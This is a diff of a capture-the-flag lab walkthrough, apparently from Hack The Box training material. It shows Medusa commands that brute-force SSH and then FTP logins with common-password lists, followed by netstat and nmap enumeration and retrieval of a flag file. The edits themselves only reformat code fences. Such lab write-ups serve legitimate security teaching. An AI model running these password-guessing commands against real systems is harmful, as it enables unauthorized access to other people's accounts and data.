@@ -16,8 +16,7 @@ We begin our exploration by targeting an SSH server running on a remote system. 
 
 The following command serves as our starting point:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
 ```
 
@@ -30,8 +29,7 @@ Let's break down each component:
 - `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
 - `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
 
 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
@@ -45,8 +43,7 @@ Upon execution, Medusa will display its progress as it cycles through the passwo
 
 With the password in hand, establish an SSH connection using the following command and enter the found password when prompted:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ssh sshuser@<IP> -p PORT
 ```
 
@@ -56,8 +53,7 @@ This command will initiate an interactive SSH session, granting you access to th
 
 Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ netstat -tulpn | grep LISTEN
 
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
@@ -67,8 +63,7 @@ tcp6       0      0 :::21                   :::*                    LISTEN      
 
 Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap localhost
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
@@ -89,8 +84,7 @@ Having identified the FTP server, you can proceed to brute-force its authenticat
 
 If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
 
 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
@@ -116,8 +110,7 @@ The key differences here are:
 
 Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information.:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
 
 Trying [::1]:21 ...
@@ -146,8 +139,7 @@ ftp> exit
 
 Then read the file to get the flag:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat flag.txt
 HTB{...}
 ```
